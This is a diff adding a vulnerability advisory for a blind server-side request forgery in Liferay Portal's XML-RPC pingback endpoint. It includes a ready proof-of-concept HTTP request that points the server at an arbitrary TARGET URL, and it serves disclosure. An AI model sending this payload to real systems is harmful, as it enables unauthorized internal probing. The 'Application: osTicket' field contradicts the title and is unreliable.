@@ -1,0 +1,83 @@
+1. ADVISORY INFORMATION
+
+========================================
+
+Title: Liferay Portal < 7.0.4 Blind Server-Side Request Forgery
+
+Application: osTicket
+
+Remotely Exploitable: Yes
+
+Authentication Required: NO
+
+Versions Affected: <= 7.0.4
+
+Technology: Java
+
+Vendor URL: liferay.com
+
+Date of found: 04 December 2017
+
+Disclosure: 25 June 2018
+
+Author: Mehmet Ince
+
+
+
+2. CREDIT
+
+========================================
+
+This vulnerability was identified during penetration test
+
+by Mehmet INCE from PRODAFT / INVICTUS
+
+
+
+3. Technical Details & POC
+
+========================================
+
+POST /xmlrpc/pingback HTTP/1.1
+
+Host: mehmetince.dev:8080
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/47.0.2526.73 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Content-Length: 361
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<methodCall>
+
+<methodName>pingback.ping</methodName>
+
+<params>
+
+<param>
+
+<value>http://TARGET/</value>
+
+</param>
+
+<param>
+
+<value>http://mehmetince.dev:8080/web/guest/home/-/blogs/30686</value>
+
+</param>
+
+</params>
+
+</methodCall>
